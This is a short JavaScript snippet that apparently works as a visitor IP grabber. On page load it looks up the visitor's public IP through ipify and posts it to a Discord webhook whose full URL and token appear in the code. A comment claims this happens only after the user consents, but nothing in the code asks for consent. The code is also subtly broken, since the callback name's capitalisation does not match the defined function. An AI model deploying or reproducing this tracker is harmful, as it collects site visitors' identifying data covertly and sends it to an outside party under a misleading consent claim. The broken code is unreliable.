function getUserIP(callback) {
    // Making a request to a third-party service to get the IP address
    fetch('https://api64.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const ipAddress = data.ip;
        callback(ipAddress);
      })
      .catch(error => {
        console.error('Error fetching IP address:', error);
      });
  }
  
  // Function to send the IP address to the webhook
  function sendIPToWebhook(ipAddress) {
    // Using fetch to send the IP address to the specified webhook
    fetch('https://ptb.discord.com/api/webhooks/1188279777661026325/2RgL-NrskSu4HectQ2u-abe3Vvt4ykm66245OZVgD_RUDJ4Oi1iV0JO-HIRS9SW1HHqj', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ ip_address: ipAddress }),
    })
    .then(response => {
      if (response.ok) {
        console.log('IP address sent successfully.');
      } else {
        console.error('Failed to send IP address.');
      }
    })
    .catch(error => {
      console.error('Error sending IP address:', error);
    });
  }
  
  // When the user gives consent (for example, after clicking an "Agree" button)
  // Call the functions to get the IP and send it to the webhook
  document.addEventListener('DOMContentLoaded', function() {
   // This function will be executed when DOMContentLoaded event occurs
   getUserIP(sendIPtoWebhook);
 });

